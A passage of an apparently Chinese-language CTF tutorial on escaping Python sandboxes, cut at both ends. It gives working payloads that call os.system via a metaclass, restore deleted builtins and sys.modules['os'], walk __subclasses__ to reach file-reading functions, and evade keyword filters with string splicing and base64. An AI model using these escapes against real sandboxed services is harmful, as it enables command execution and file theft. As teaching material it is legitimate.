&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tmp = WOOD()[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;如何绕过 &lt;code&gt;Call&lt;/code&gt; ？可以用 &lt;code&gt;metaclass&lt;/code&gt; ，我们指定一个类的 &lt;code&gt;__getitem__==os.system&lt;/code&gt; ，使用 mateclass 可以让类拥有属性，但不是类生成的对象具有这个属性，这样我们就不用调用实例化类的 Call，从而进行绕过 Call。&lt;/p&gt;
&lt;p&gt;因此最终 payload 为:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;WOOD&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;type&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __getitem__=os.system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;WHALE&lt;/span&gt;(metaclass=WOOD):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmp = WHALE[&lt;span class=&#34;string&#34;&gt;&amp;#x27;sh&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/09/KHuyBwsjt1FZEQP.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h2&gt;
&lt;h3 id=&#34;绕过删除模块或方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过删除模块或方法&#34;&gt;#&lt;/a&gt; 绕过删除模块或方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;del&lt;/code&gt;  会删除模块或方法，比如下面删除了 &lt;code&gt;builitins&lt;/code&gt;  模块的 &lt;code&gt;eval&lt;/code&gt;  方法&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; function &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;del&lt;/span&gt; __builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;KeyError: &lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;reload重加载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#reload重加载&#34;&gt;#&lt;/a&gt; reload 重加载&lt;/h4&gt;
&lt;p&gt;reload 可以重新加载被删除的模块&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; function &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;del&lt;/span&gt; __builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;KeyError: &lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;reload(__builtins__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;module &lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtin__&amp;#x27;&lt;/span&gt; (built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt;)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;eval&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; function &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在 Python 3 中， &lt;code&gt;reload() &lt;/code&gt; 函数被移动到 &lt;code&gt;importlib&lt;/code&gt;  模块中，所以如果要使用  &lt;code&gt;reload()&lt;/code&gt;  函数，需要先导入 &lt;code&gt;importlib&lt;/code&gt;  模块。&lt;/p&gt;
&lt;h4 id=&#34;恢复-sysmodules&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#恢复-sysmodules&#34;&gt;#&lt;/a&gt; 恢复 sys.modules&lt;/h4&gt;
&lt;p&gt;一些过滤中可能将  &lt;code&gt;sys.modules[&#39;os&#39;]&lt;/code&gt;  进行修改。这个时候即使将 os 模块导入进来，也是无法使用的.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;sys.modules[&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;not allowed&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AttributeError: &lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt; has no attribute &lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;由于很多别的命令执行库也使用到了 os, 因此也会受到相应的影响，例如 subprocess&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;subprocess&amp;#x27;&lt;/span&gt;).Popen(&lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;, shell=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;688&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Popen&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;object&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1708&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; Popen&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;_handle_exitstatus&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, sts, _WIFSIGNALED=os.WIFSIGNALED,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;AttributeError: &lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt; has no attribute &lt;span class=&#34;string&#34;&gt;&amp;#x27;WIFSIGNALED&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载，没有则加载。因此我们只需要将 os 模块删除，然后再次导入即可.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sys.modules[&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;not allowed&amp;#x27;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;del&lt;/span&gt; sys.modules[&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#删除os模块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os &lt;span class=&#34;comment&#34;&gt;#重新导入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;基于继承链获取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基于继承链获取&#34;&gt;#&lt;/a&gt; 基于继承链获取&lt;/h4&gt;
&lt;p&gt;在清空了  &lt;code&gt;__builtins__&lt;/code&gt; 的情况下，我们也可以通过索引 subclasses 来找到这些内建函数。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 根据环境找到 bytes 的索引，此处为 5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;().__class__.__base__.__subclasses__()[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;bytes&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在上面 &lt;code&gt;calc_jail_beginner_level4.1&lt;/code&gt;  题目中运用到了这个方式&lt;/p&gt;
&lt;h3 id=&#34;绕过基于字符串匹配的过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过基于字符串匹配的过滤&#34;&gt;#&lt;/a&gt; 绕过基于字符串匹配的过滤&lt;/h3&gt;
&lt;h4 id=&#34;字符串转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#字符串转换&#34;&gt;#&lt;/a&gt; 字符串转换&lt;/h4&gt;
&lt;h5 id=&#34;字符串拼接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#字符串拼接&#34;&gt;#&lt;/a&gt; 字符串拼接&lt;/h5&gt;
&lt;p&gt;在我们的 payload 中，例如如下的 payload， &lt;code&gt;__builtins__&lt;/code&gt;   &lt;code&gt;file&lt;/code&gt;  这些字符串如果被过滤了，就可以使用字符串变换的方式进行绕过。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].__subclasses__()[&lt;span class=&#34;number&#34;&gt;59&lt;/span&gt;].__init__.__globals__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;#x27;E:/passwd&amp;#x27;&lt;/span&gt;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].__subclasses__()[&lt;span class=&#34;number&#34;&gt;59&lt;/span&gt;].__init__.__globals__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__buil&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;tins__&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;fi&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;le&amp;#x27;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;#x27;E:/passwd&amp;#x27;&lt;/span&gt;).read()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;局限性：如果过滤的是  &lt;code&gt;__class__&lt;/code&gt;  或者  &lt;code&gt;__mro__&lt;/code&gt;  这样的属性名，就无法采用变形来绕过了。&lt;/p&gt;
&lt;h5 id=&#34;base64变形&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#base64变形&#34;&gt;#&lt;/a&gt; base64 变形&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;base64.b64encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;X19pbXBvcnRfXw==&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;base64.b64encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;b3M=&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;X19pbXBvcnRfXw==&amp;#x27;&lt;/span&gt;.decode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;base64&amp;#x27;&lt;/span&gt;)](&lt;span class=&#34;string&#34;&gt;&amp;#x27;b3M=&amp;#x27;&lt;/span&gt;.decode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;base64&amp;#x27;&lt;/span&gt;)).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;calc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;逆序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#逆序&#34;&gt;#&lt;/a&gt; 逆序&lt;/h5&gt;
